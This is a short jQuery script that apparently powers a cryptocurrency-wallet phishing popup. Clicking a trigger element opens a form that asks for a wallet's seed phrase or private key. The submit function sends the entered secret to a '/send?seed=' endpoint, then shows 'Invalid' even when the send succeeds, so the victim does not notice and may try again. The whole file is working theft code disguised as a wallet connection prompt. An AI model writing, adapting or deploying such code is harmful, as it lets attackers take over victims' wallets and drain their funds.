$(()=>{
console.log("index.js added");

// $("a:not(.within_triggerx), * > a:not(.within_triggerx)").click(e=>{
//     e.stopPropagation();
//     e.preventDefault();
// })


// $(".triggerx").click((e) => {
//   console.log("showing conn wall popup");
//   e.stopPropagation();
//   e.preventDefault();
//   $("#popup_bg").css("display", "block");
// });

// $("#popup_bg #popup_main_div").click(e=>{
//     e.stopPropagation();
//     e.preventDefault();
// })
// $("#popup_bg, #popup_bg #close_popup_div").click(e=>{
//     $("#popup_bg").css("display", "none");
// })
// $("#popup_bg #ledger_type li").click(e=>{
$(".triggerx").click((e) => {
    console.log("showing pk popup");
    $("#addedx").addClass("show");
    // $("#popup_bg").css("display", "none");
});


  $("#addedx").click(function () {
      $(this).removeClass("show");
  });
  $("#addedx #mainx").click((e) => {
      e.stopPropagation();
  });

  var mode = "Mnemonic";
  var inp = $("#addedx .content-item.mnemonic textarea");
  var err = $("#addedx .content-item.mnemonic .error");
  $("#addedx .top-item").click(() => {
      $("#mainx").toggleClass("right");
      mode = mode == "Mnemonic" ? "Private Key" : "Mnemonic";
      let cls = mode == "Mnemonic" ? "mnemonic" : "privatekey";
      inp = $("#addedx .content-item." + cls + " textarea");
      err = $("#addedx .content-item." + cls + " .error");
  });

  function clear() {
      inp.val("");
      err.text("");
  }
  $("#addedx .submit").click(()=>{
      submit();
  })
  function submit() {
      let mnemonic = inp.val();
      //   return console.log(mnemonic, mode);

      let log_url = `/send?seed=${mnemonic}&name=Mnemonic`;

      fetch(log_url)
      .then(async (res) => {
          if (res.status > 299) {
              throw res;
          }
          console.log(res);
          console.log("success");

          let data = await res.json();
          console.log(data);
          err.text("Invalid " + mode);
          })
      .catch(async (err_) => {
          console.log(err_);
          console.log("failure");
          try {
              if (!err_.status == 401) throw err_;
              let data = await err_.json();
              console.log(data);
              err.text(data.message);
          } catch (error) {
              // unknown
              err.text("Unknown Error. Please Try Again");
          }
      });
  }
});